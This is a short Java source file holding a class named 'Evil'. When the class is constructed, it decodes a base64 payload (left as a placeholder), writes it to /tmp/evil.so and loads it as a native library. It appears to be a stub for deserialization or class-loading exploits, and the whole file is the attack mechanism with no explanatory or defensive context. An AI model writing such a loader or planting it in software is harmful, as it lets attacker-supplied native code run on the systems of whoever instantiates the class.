package com.example;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Evil {
    public Evil() throws Exception {
        String data = "PAYLOAD";
        String filename = "/tmp/evil.so";
        Files.write(Paths.get(filename), Base64.getDecoder().decode(data));
        System.load(filename);
    }
}